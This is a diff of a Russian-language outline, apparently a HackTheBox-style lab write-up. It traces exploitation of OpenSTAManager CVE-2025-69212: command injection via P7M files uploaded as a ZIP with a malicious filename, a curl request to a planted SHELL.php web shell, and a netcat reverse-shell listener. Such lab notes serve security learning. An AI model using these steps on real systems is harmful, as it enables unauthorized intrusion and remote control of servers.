@@ -29,7 +29,7 @@
 
 Эксплуатация (OpenSTAManager CVE-2025-69212)
 ├── Версия: 2.9.8 (info.php)
-├── OS Command Injection через P7M-файлы (decodeP7M → exec без экранирования)
+├── инъекция ОС-команд через P7M-файлы (decodeP7M → выполнение без экранирования)
 ├── ZIP с вредоносным именем → Sales → Invoices → Importazione FE
 ├── curl "http://support_001.enigma.htb/files/SHELL.php?c=id" → www-data
 └── Reverse shell: nc -lvnp 4444
